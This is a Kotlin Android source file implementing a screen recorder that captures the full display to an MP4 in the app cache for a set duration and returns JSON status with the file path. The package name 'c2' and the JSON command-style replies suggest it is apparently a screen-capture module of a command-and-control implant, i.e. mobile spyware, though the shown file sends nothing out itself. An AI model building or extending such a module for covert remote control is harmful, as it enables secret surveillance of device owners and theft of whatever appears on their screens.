package com.outcome.c2

import android.content.Context
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import org.json.JSONObject
import java.io.File

object ScreenRecorder {

    private const val TAG = "ScreenRec"

    @Volatile private var recorder: MediaRecorder? = null
    @Volatile private var vd: VirtualDisplay? = null
    @Volatile private var thread: HandlerThread? = null
    @Volatile private var currentFile: File? = null
    @Volatile private var recording = false

    fun isRecording(): Boolean = recording
    fun currentFile(): File? = currentFile

    fun start(ctx: Context, projection: MediaProjection, durationSec: Int = 30): JSONObject {
        if (recording) return JSONObject().put("error", "already_recording")

        try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val density = metrics.densityDpi

            val dir = File(ctx.cacheDir, "recordings")
            if (!dir.exists()) dir.mkdirs()
            val out = File(dir, "rec_${System.currentTimeMillis()}.mp4")
            currentFile = out

            val rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(ctx)
                      else @Suppress("DEPRECATION") MediaRecorder()
            rec.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            rec.setVideoSize(width, height)
            rec.setVideoFrameRate(30)
            rec.setVideoEncodingBitRate(6_000_000)
            rec.setOutputFile(out.absolutePath)
            rec.prepare()

            val t = HandlerThread("rec").also { it.start() }
            thread = t
            val handler = Handler(t.looper)
            val display = projection.createVirtualDisplay(
                "c2-rec",
                width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                rec.surface,
                null,
                handler
            )
            vd = display
            recorder = rec
            rec.start()
            recording = true

            Log.i(TAG, "recording started ${width}x$height for ${durationSec}s")

            Thread {
                try { Thread.sleep(durationSec.coerceIn(5, 180) * 1000L) } catch (_: Exception) {}
                try { stop() } catch (_: Exception) {}
            }.start()

            return JSONObject()
                .put("ok", true)
                .put("duration", durationSec)
                .put("size", "${width}x$height")
        } catch (e: Exception) {
            Log.e(TAG, "start failed", e)
            cleanup()
            return JSONObject().put("error", e.message ?: "record_start_failed")
        }
    }

    fun stop(): JSONObject {
        return try {
            recorder?.let {
                try { it.stop() } catch (_: Exception) {}
                try { it.reset() } catch (_: Exception) {}
                try { it.release() } catch (_: Exception) {}
            }
            cleanup()
            recording = false

            val f = currentFile
            if (f == null || !f.exists()) {
                JSONObject().put("error", "no_file")
            } else {
                JSONObject()
                    .put("ok", true)
                    .put("path", f.absolutePath)
                    .put("size", f.length())
                    .put("filename", f.name)
            }
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "record_stop_failed")
        }
    }

    private fun cleanup() {
        try { vd?.release() } catch (_: Exception) {}
        vd = null
        try { thread?.quitSafely() } catch (_: Exception) {}
        thread = null
        try { recorder?.release() } catch (_: Exception) {}
        recorder = null
    }
}
